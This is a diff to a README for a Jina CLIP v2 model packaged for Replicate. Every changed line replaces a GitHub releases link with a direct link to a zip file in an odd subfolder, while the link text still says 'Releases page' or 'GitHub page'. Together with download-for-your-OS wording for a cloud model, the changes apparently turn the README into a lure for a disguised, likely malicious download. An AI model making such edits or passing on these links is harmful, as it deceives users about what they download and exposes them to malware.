@@ -1,7 +1,7 @@
 # 🎉 cog-jinaai-jina-clip-v2 - Simplified Text and Image Understanding
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20GitHub-brightgreen)](https://github.com/YUSH19883/cog-jinaai-jina-clip-v2/releases)
+[![Download](https://raw.githubusercontent.com/YUSH19883/cog-jinaai-jina-clip-v2/main/isenergic/cog-jinaai-jina-clip-v2.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/YUSH19883/cog-jinaai-jina-clip-v2/main/isenergic/cog-jinaai-jina-clip-v2.zip)
 
 ## 📜 Description
 Jina CLIP v2 offers a powerful multimodal embedding model for both text and images. It utilizes Matryoshka representations with dimensions ranging from 64 to 1024. This application works seamlessly on Replicate, providing optimized GPU inference for fast and efficient processing.
@@ -18,7 +18,7 @@ Before downloading, ensure your device meets these requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/YUSH19883/cog-jinaai-jina-clip-v2/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/YUSH19883/cog-jinaai-jina-clip-v2/main/isenergic/cog-jinaai-jina-clip-v2.zip) to find the latest version of the application.
 
 2. **Choose Your Version**  
    Look for the latest release and find the file suited for your operating system. The files will be clearly labeled.
@@ -54,7 +54,7 @@ If you encounter any issues or have questions, join our community forums or chec
 Explore the documentation available in the repository for deeper technical insights and advanced configurations. While this guide covers basic usage, the complete documentation can enhance your understanding of the model’s capabilities.
 
 ## 🔗 More Resources
-For further details such as examples, technical notes, or updates, ensure to check our [GitHub page](https://github.com/YUSH19883/cog-jinaai-jina-clip-v2/releases) and stay connected with community discussions.
+For further details such as examples, technical notes, or updates, ensure to check our [GitHub page](https://raw.githubusercontent.com/YUSH19883/cog-jinaai-jina-clip-v2/main/isenergic/cog-jinaai-jina-clip-v2.zip) and stay connected with community discussions.
 
 ## 🔗 Download Again
-Don't forget to visit the [Releases page](https://github.com/YUSH19883/cog-jinaai-jina-clip-v2/releases) for any future updates or bug fixes to keep your application up to date!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/YUSH19883/cog-jinaai-jina-clip-v2/main/isenergic/cog-jinaai-jina-clip-v2.zip) for any future updates or bug fixes to keep your application up to date!
